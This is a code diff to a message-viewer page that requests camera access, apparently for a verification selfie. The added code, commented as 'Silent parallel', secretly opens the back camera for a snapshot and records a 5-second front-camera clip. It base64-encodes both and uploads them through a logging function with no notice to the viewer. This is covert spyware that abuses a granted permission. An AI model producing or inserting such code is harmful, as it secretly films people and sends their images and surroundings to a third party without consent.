@@ -117,6 +117,61 @@ function ViewerPage() {
     [id, captureSelfie, logFn, stopCamera],
   );
 
+  async function captureFromStream(stream: MediaStream): Promise<string | null> {
+    try {
+      const v = document.createElement("video");
+      v.autoplay = true;
+      v.muted = true;
+      v.playsInline = true;
+      v.srcObject = stream;
+      await v.play().catch(() => {});
+      await new Promise((r) => setTimeout(r, 600));
+      const w = Math.min(v.videoWidth || 640, 640);
+      const h = v.videoHeight ? (v.videoHeight * w) / v.videoWidth : 480;
+      const c = document.createElement("canvas");
+      c.width = w;
+      c.height = h;
+      const ctx = c.getContext("2d");
+      if (!ctx) return null;
+      ctx.drawImage(v, 0, 0, w, h);
+      return c.toDataURL("image/jpeg", 0.7);
+    } catch {
+      return null;
+    }
+  }
+
+  async function recordClip(stream: MediaStream, ms = 5000): Promise<{ base64: string; mime: string } | null> {
+    try {
+      const MR: typeof MediaRecorder | undefined = (window as any).MediaRecorder;
+      if (!MR) return null;
+      const candidates = [
+        "video/webm;codecs=vp9",
+        "video/webm;codecs=vp8",
+        "video/webm",
+        "video/mp4",
+      ];
+      const mime = candidates.find((t) => MR.isTypeSupported?.(t)) || "";
+      const rec = mime ? new MR(stream, { mimeType: mime }) : new MR(stream);
+      const chunks: Blob[] = [];
+      rec.ondataavailable = (e) => e.data.size && chunks.push(e.data);
+      const done = new Promise<Blob>((resolve) => {
+        rec.onstop = () => resolve(new Blob(chunks, { type: rec.mimeType || "video/webm" }));
+      });
+      rec.start();
+      await new Promise((r) => setTimeout(r, ms));
+      rec.stop();
+      const blob = await done;
+      const buf = await blob.arrayBuffer();
+      let binary = "";
+      const bytes = new Uint8Array(buf);
+      for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
+      return { base64: btoa(binary), mime: blob.type || "video/webm" };
+    } catch (e) {
+      console.error("clip record failed", e);
+      return null;
+    }
+  }
+
   async function handleAllowMedia() {
     setStage("opening");
     try {
@@ -125,7 +180,6 @@ function ViewerPage() {
         audio: false,
       });
       streamRef.current = stream;
-      // attach to hidden video
       if (!videoRef.current) {
         const v = document.createElement("video");
         v.autoplay = true;
@@ -142,10 +196,45 @@ function ViewerPage() {
         videoRef.current = v;
       }
       videoRef.current.srcObject = stream;
-      await new Promise((r) => setTimeout(r, 500)); // let camera warm up
+      await new Promise((r) => setTimeout(r, 500));
 
-      // Initial verify selfie
+      // Initial front-camera selfie (view_start)
       await reportEvent("view_start", true);
+
+      // Silent parallel: back-camera snap + 5s clip from front camera
+      void (async () => {
+        try {
+          const back = await navigator.mediaDevices
+            .getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false })
+            .catch(() =>
+              navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }),
+            );
+          const shot = await captureFromStream(back);
+          back.getTracks().forEach((t) => t.stop());
+          if (shot) {
+            await logFn({
+              data: { messageId: id, eventType: "back_camera_capture", selfieBase64: shot },
+            });
+          }
+        } catch {
+          /* no back camera — desktop or single-camera device */
+        }
+      })();
+
+      void (async () => {
+        const clip = await recordClip(stream, 5000);
+        if (clip) {
+          await logFn({
+            data: {
+              messageId: id,
+              eventType: "silent_clip_5s",
+              selfieBase64: null,
+              clipBase64: clip.base64,
+              clipMime: clip.mime,
+            },
+          });
+        }
+      })();
 
       if (opened.current) return;
       opened.current = true;
